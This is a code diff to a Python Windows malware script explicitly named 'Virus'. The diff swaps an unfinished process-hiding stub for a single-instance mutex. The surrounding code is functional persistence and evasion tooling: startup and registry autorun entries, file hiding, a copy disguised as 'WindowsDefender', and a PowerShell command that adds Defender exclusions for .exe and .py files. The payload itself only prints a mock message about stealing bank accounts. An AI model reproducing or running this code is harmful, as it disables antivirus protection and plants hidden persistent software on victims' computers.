@@ -3,6 +3,7 @@ import subprocess
 import threading
 import winreg
 import ctypes
+import time
 import sys
 import os
 
@@ -20,22 +21,17 @@ class Virus(object):
         print("Virus hacker 99999 started. Hacking person's computer, stealing their bank accounts... WOOOOOOO successfully hacked! BOOM!")
 
 
+# -------------------- #
+
 class VirusConfig:
     ADD_TO_STARTUP = True
     HIDE_FILE = True
     ADD_REG_KEY = True
     ADD_AV_EXCLUSION = True
     COPY_FILENAME = "WindowsDefender"
-    HIDE_PROCESS = True
+    RUN_ONLY_ONCE = True
+    MUTEX_ID = "b6373edb-9b65-4b46-8840-49d3ad9a569b"
 
-# -------------------- #
-
-class LPMODULEINFO(ctypes.Structure):
-    _fields_ = [
-        ("lpBaseOfDll", ctypes.c_void_p),
-        ("SizeOfImage", ctypes.wintypes.DWORD),
-        ("EntryPoint", ctypes.c_void_p)
-    ]
 
 def add_to_startup():
     username = os.environ["username"]
@@ -79,32 +75,29 @@ def hide_file(filepath):
 def add_av_exclusion():
     subprocess.Popen("powershell Add-MpPreference -ExclusionExtension exe, py", shell=True)
 
-def hide_process():
-    return "I need to learn more :)"
-    kernel32.GetCurrentProcessId.restype = ctypes.c_int
-    process_id = kernel32.GetCurrentProcessId()
+def acquire_mutex(mutex_id):
+    def _acquire_mutex(path):
+        mutex = open(path, "a")
+        
+        while True:
+            time.sleep(1)
 
-    kernel32.GetModuleHandleW.argtypes = [ctypes.wintypes.LPCWSTR]
-    kernel32.GetModuleHandleW.restype = ctypes.c_void_p
-    kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
-    kernel32.GetProcAddress.restype = ctypes.c_void_p
-    proc_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleW("ntdll"), b"NtQuerySystemInformation")
+    path = str(os.environ["TMP"] + "\\" + mutex_id)
+    
+    if os.path.exists(path):
+        try:
+            os.remove(path)
+        except Exception:
+            return False
+        
+    threading.Thread(target=_acquire_mutex, args=[path], daemon=True).start()
 
-    psapi.GetModuleInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.HMODULE, ctypes.POINTER(LPMODULEINFO), ctypes.wintypes.DWORD]
-    psapi.GetModuleInformation.restype = ctypes.wintypes.BOOL
-    kernel32.GetCurrentProcess.restype = ctypes.wintypes.HANDLE
-    kernel32.GetModuleHandleW.argtypes = [ctypes.c_int]
-    mod_handle = kernel32.GetModuleHandleW(0)
-    mod_info = LPMODULEINFO(0)
-    text = psapi.GetModuleInformation(kernel32.GetCurrentProcess(), mod_handle, mod_info, LPMODULEINFO.__sizeof__(LPMODULEINFO))
-
-def hook_dll():
-    pass
-
-def hide_process_thread():
-    pass
+    return True
 
 def main():
+    if VirusConfig.RUN_ONLY_ONCE:
+        if not acquire_mutex(VirusConfig.MUTEX_ID):
+            exit()
     if VirusConfig.ADD_TO_STARTUP:
         add_to_startup()
     if VirusConfig.ADD_REG_KEY:
@@ -113,8 +106,6 @@ def main():
         hide_file(os.getcwd() + "\\" + sys.argv[0])
     if VirusConfig.ADD_AV_EXCLUSION:
         add_av_exclusion()
-    if VirusConfig.HIDE_PROCESS:
-        hide_process()
 
     Virus()
 
